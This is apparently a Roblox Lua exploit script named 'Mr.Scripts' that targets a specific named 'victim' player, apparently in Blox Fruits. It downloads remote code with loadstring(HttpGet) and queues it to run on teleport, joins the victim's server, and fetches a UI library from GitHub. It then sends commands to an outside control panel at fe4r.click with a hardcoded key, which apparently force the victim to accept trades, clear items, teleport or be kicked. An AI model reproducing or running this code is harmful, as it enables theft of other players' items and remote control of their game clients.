do
    local Players = game:GetService('Players')
    local LP = Players.LocalPlayer
    local reqCode = [==[loadstring(game:HttpGet("https://gist.githubusercontent.com/XHupScript/a230004fd745f4d783e4a648ab795346/raw/6f940349a73b9d24e7982d29a56debcfd33f9e9d/teleport_base.lua"))()]==]
    local function doQueue()
        pcall(function()
            if syn and syn.queue_on_teleport then
                syn.queue_on_teleport(reqCode)
            elseif typeof(queue_on_teleport) == 'function' then
                queue_on_teleport(reqCode)
            elseif typeof(queueteleport) == 'function' then
                queueteleport(reqCode)
            end
        end)
    end
    pcall(function()
        LP.OnTeleport:Connect(function(state)
            if state == Enum.TeleportState.InProgress then doQueue() end
        end)
    end)
    _G.__MrScripts_doQueue = doQueue
end

local UserId = "5690459966"
local VictimName = "MgZeRo11222"
local TargetPlaceId = "79091703265657"
local JOBID = "d0da0a87-2536-4f24-9115-13f183dd73c6"

if game.JobId ~= JOBID then
    if _G.__MrScripts_doQueue then pcall(_G.__MrScripts_doQueue) end
    local JoinPlayerFromProfile = game:GetService("ReplicatedStorage"):FindFirstChild("Remotes") and game:GetService("ReplicatedStorage").Remotes:FindFirstChild("JoinPlayerFromProfile")
    if JoinPlayerFromProfile then
        pcall(function() JoinPlayerFromProfile:FireServer(UserId) end)
    else
        local options = Instance.new("TeleportOptions")
        options.ServerInstanceId = JOBID
        game:GetService("TeleportService"):TeleportAsync(TargetPlaceId, {game:GetService("Players").LocalPlayer}, options)
    end
    return
end

task.wait(3)

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local victim = Players:GetPlayerByUserId(tonumber(UserId))

if not victim then
    local startTime = tick()
    while tick() - startTime < 15 do
        task.wait(0.5)
        victim = Players:GetPlayerByUserId(tonumber(UserId))
        if victim then break end
    end
end

if not victim then
    warn("[Mr.Scripts] Could not find the victim.")
    return
end

-- Teleport to chair
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TweenService = game:GetService("TweenService")
local CommF_ = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("CommF_")

local function getHRP()
    return (LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()):WaitForChild("HumanoidRootPart", 10)
end

local function requestEntrance(pos)
    pcall(function() CommF_:InvokeServer("requestEntrance", pos) end)
    local hrp = getHRP()
    if hrp then hrp.CFrame += Vector3.new(0, 50, 0) end
    task.wait(0.5)
end

local function tpSea2()
    local hrp = getHRP()
    if not hrp then return end
    local targetCF = CFrame.new(-297.66, 73.22, 282.3)
    local dist = (hrp.Position - targetCF.Position).Magnitude
    if dist < 5 then hrp.CFrame = targetCF return end

    local part = Instance.new("Part", LocalPlayer.Character)
    part.Name = "PartTele"
    part.Size = Vector3.new(10, 1, 10)
    part.Anchored = true
    part.Transparency = 1
    part.CanCollide = false
    part.CFrame = hrp.CFrame

    local move = true
    part:GetPropertyChangedSignal("CFrame"):Connect(function()
        if move and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
            LocalPlayer.Character.HumanoidRootPart.CFrame = part.CFrame
        end
    end)

    local tween = TweenService:Create(part, TweenInfo.new(dist / 360, Enum.EasingStyle.Linear), {CFrame = targetCF})
    tween:Play()
    tween.Completed:Wait()
    move = false
    part:Destroy()
end

local function tpSea3()
    if not getHRP() then return end
    requestEntrance(Vector3.new(-12471.17, 374.94, -7551.678))
end

if TargetPlaceId == "4442272183" or TargetPlaceId == "79091703265657" then
    tpSea2()
elseif TargetPlaceId == "7449423635" or TargetPlaceId == "100117331123089" then
    tpSea3()
end

local hrp = getHRP()
local victimHrp = victim and victim.Character and victim.Character:FindFirstChild("HumanoidRootPart")
if hrp and victimHrp then
    local vPos = victimHrp.Position
    local bestSeat, bestDist = nil, math.huge
    for _, obj in ipairs(workspace:GetDescendants()) do
        if obj:IsA("Seat") or obj:IsA("VehicleSeat") then
            local d = (vPos - obj.Position).Magnitude
            if d > 1 and d < 12 and d < bestDist then
                bestDist, bestSeat = d, obj
            end
        end
    end
    if bestSeat then
        hrp.CFrame = CFrame.new(bestSeat.Position + Vector3.new(0, 3, 0))
        task.wait(0.4)
        local h = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
        if h then h.Sit = true end
    else
        hrp.CFrame = victimHrp.CFrame + Vector3.new(3, 0, 0)
    end
end

task.wait(2)
local TsuoUILib
pcall(function()
    local result = game:HttpGet("https://raw.githubusercontent.com/Tsuo7/TsuoHub/refs/heads/main/tsuoui")
    if result and #result > 1000 then
        local chunk = loadstring(result)
        if chunk then
            local lib = chunk()
            if type(lib) == "table" and type(lib.CreateWindow) == "function" then
                TsuoUILib = lib
            else
                for _, v in ipairs(getgc(true)) do
                    if type(v) == "table" and rawget(v, "CreateWindow") then
                        TsuoUILib = v
                        break
                    end
                end
            end
        end
    end
end)

local function SendCmd(cmd)
    pcall(function()
        local req = syn and syn.request or http_request or request or http and http.request
        if req then
            req({
                Url = "https://panel.fe4r.click/api/set-command",
                Method = "POST",
                Headers = { ["Content-Type"] = "application/json" },
                Body = game:GetService("HttpService"):JSONEncode({
                    user = VictimName,
                    cmd = cmd,
                    key = "moziu-super-secret"
                })
            })
        end
    end)
end

if TsuoUILib then
    local Window = TsuoUILib:CreateWindow({
        Title = "Mr.Scripts Control",
        SubTitle = "Victim: " .. victim.Name,
        Logo = "rbxassetid://90690292624964",
        Theme = "Dark",
        Accent = Color3.fromRGB(150, 90, 255),
        ToggleKey = Enum.KeyCode.RightControl,
        AutoSave = "mrscripts_control"
    })

    local MainTab = Window:AddTab({ Title = "Trade", Description = "Trade Management", Icon = "gamepad" })
    MainTab:AddSection("Actions")
    MainTab:AddButton({ Title = "Accept Trade", Description = "Forces the victim to accept", ButtonText = "Accept", Callback = function() SendCmd("?accept") end })
    MainTab:AddButton({ Title = "Cancel Trade", Description = "Cancels the current trade", ButtonText = "Cancel", Callback = function() SendCmd("?cancel") end })
    MainTab:AddButton({ Title = "Teleport", Description = "Teleports victim to you", ButtonText = "TP", Callback = function() SendCmd("?tp") end })
    MainTab:AddButton({ Title = "Jump", Description = "Makes the victim jump", ButtonText = "Jump", Callback = function() SendCmd("?jump") end })

    local FruitTab = Window:AddTab({ Title = "Fruits", Description = "Manage Trade Items", Icon = "apple" })
    FruitTab:AddSection("Add/Remove")

    local currentFruit = "Dragon"
    FruitTab:AddInput("fruitInput", {
        Title = "Fruit Name",
        Description = "Name of the fruit",
        Placeholder = "Dragon",
        Callback = function(txt) currentFruit = txt end
    })

    FruitTab:AddButton({ Title = "Add Fruit", ButtonText = "Add", Callback = function() SendCmd("+" .. currentFruit) end })
    FruitTab:AddButton({ Title = "Remove Fruit", ButtonText = "Remove", Callback = function() SendCmd("-" .. currentFruit) end })
    FruitTab:AddButton({ Title = "Reset Fruit", ButtonText = "Reset", Callback = function() SendCmd("?reset " .. currentFruit) end })

    FruitTab:AddSection("Bulk Actions")
    FruitTab:AddButton({ Title = "Add All Mythical", ButtonText = "Add All", Callback = function() SendCmd("?addallfruits") end })
    FruitTab:AddButton({ Title = "Add All Premium", ButtonText = "Add All", Callback = function() SendCmd("?addallpre") end })
    FruitTab:AddButton({ Title = "Add All Skins", ButtonText = "Add All", Callback = function() SendCmd("?skin") end })
    FruitTab:AddButton({ Title = "Clear All Items", ButtonText = "Clear All", Callback = function() SendCmd("?clearall") end })

    local KickTab = Window:AddTab({ Title = "Kick", Description = "Kick the victim", Icon = "user-x" })
    KickTab:AddSection("Kick")

    local kickReason = "Kicked by Mr.Scripts"
    KickTab:AddInput("kickInput", {
        Title = "Reason",
        Description = "Reason for kicking",
        Placeholder = "No reason provided",
        Callback = function(txt) kickReason = txt end
    })

    KickTab:AddButton({ Title = "Kick Victim", ButtonText = "Kick", Callback = function() SendCmd("?kick " .. kickReason) end })
else
    print("[Mr.Scripts] Tsuo failed, loading fallback UI")
    local gui = Instance.new("ScreenGui")
    gui.Name = "MrScriptsFallbackUI"; gui.ResetOnSpawn = false
    gui.Parent = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")

    local main = Instance.new("Frame")
    main.Size = UDim2.new(0, 440, 0, 460)
    main.Position = UDim2.new(0.5, -220, 0.5, -230)
    main.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
    main.BorderSizePixel = 0; main.Active = true; main.Draggable = true
    main.Parent = gui
    Instance.new("UICorner", main).CornerRadius = UDim.new(0, 8)

    local title = Instance.new("TextLabel", main)
    title.Size = UDim2.new(1, 0, 0, 32)
    title.BackgroundColor3 = Color3.fromRGB(35, 35, 45)
    title.Text = "⚡ Mr.Scripts Control"
    title.TextColor3 = Color3.fromRGB(255,255,255)
    title.Font = Enum.Font.GothamBold; title.TextSize = 15
    Instance.new("UICorner", title).CornerRadius = UDim.new(0, 8)

    local y = 42
    local function btn(text, cb, color)
        local b = Instance.new("TextButton", main)
        b.Size = UDim2.new(0, 200, 0, 28)
        b.Position = UDim2.new(0, 10, 0, y)
        b.BackgroundColor3 = color or Color3.fromRGB(50,50,60)
        b.Text = text; b.TextColor3 = Color3.fromRGB(255,255,255)
        b.Font = Enum.Font.GothamSemibold; b.TextSize = 13
        Instance.new("UICorner", b).CornerRadius = UDim.new(0,4)
        b.MouseButton1Click:Connect(cb)
        return b
    end

    local fruitBox = Instance.new("TextBox", main)
    fruitBox.Size = UDim2.new(0, 200, 0, 28)
    fruitBox.Position = UDim2.new(0, 220, 0, 42)
    fruitBox.BackgroundColor3 = Color3.fromRGB(40,40,50)
    fruitBox.PlaceholderText = "Fruit name (Dragon)"
    fruitBox.TextColor3 = Color3.fromRGB(255,255,255)
    fruitBox.PlaceholderColor3 = Color3.fromRGB(150,150,150)
    fruitBox.Font = Enum.Font.Gotham; fruitBox.TextSize = 13; fruitBox.Text = ""
    Instance.new("UICorner", fruitBox).CornerRadius = UDim.new(0,4)

    btn("➕ Add Fruit", function() SendCmd("+" .. fruitBox.Text) end, Color3.fromRGB(45,120,230)); y = y + 34
    btn("➖ Remove Fruit", function() SendCmd("-" .. fruitBox.Text) end, Color3.fromRGB(180,80,40)); y = y + 34
    btn("🔄 Reset Fruit", function() SendCmd("?reset " .. fruitBox.Text) end, Color3.fromRGB(180,80,40)); y = y + 34
    btn("✅ Accept Trade", function() SendCmd("?accept") end, Color3.fromRGB(40,160,80)); y = y + 34
    btn("❌ Cancel Trade", function() SendCmd("?cancel") end, Color3.fromRGB(180,60,60)); y = y + 34
    btn("📍 TP Victim to Me", function() SendCmd("?tp") end, Color3.fromRGB(100,50,150)); y = y + 34
    btn("🎈 Make Victim Jump", function() SendCmd("?jump") end, Color3.fromRGB(100,50,150)); y = y + 34

    local kickBox = Instance.new("TextBox", main)
    kickBox.Size = UDim2.new(0, 420, 0, 28); kickBox.Position = UDim2.new(0, 10, 0, y)
    kickBox.BackgroundColor3 = Color3.fromRGB(40,40,50)
    kickBox.PlaceholderText = "Kick reason (optional)"
    kickBox.PlaceholderColor3 = Color3.fromRGB(150,150,150)
    kickBox.TextColor3 = Color3.fromRGB(255,255,255)
    kickBox.Font = Enum.Font.Gotham; kickBox.TextSize = 13; kickBox.Text = ""
    Instance.new("UICorner", kickBox).CornerRadius = UDim.new(0,4)
    y = y + 34

    btn("👞 Kick Victim", function() SendCmd("?kick " .. kickBox.Text) end, Color3.fromRGB(180,60,60))
end
